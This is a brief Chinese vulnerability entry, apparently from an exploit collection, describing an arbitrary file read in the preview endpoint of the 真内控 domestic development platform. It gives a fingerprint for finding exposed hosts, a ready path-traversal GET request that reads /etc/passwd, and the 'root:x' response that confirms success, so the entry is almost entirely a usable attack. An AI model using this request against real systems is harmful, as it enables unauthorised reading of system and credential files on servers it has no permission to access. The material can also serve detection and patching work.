# 真内控国产化开发平台preview任意文件读取漏洞

真内控国产化开发平台preview ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="js/npm.echarts.js"`
- **请求**：`GET /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd HTTP/1.1`
- **响应特征**：200 root:x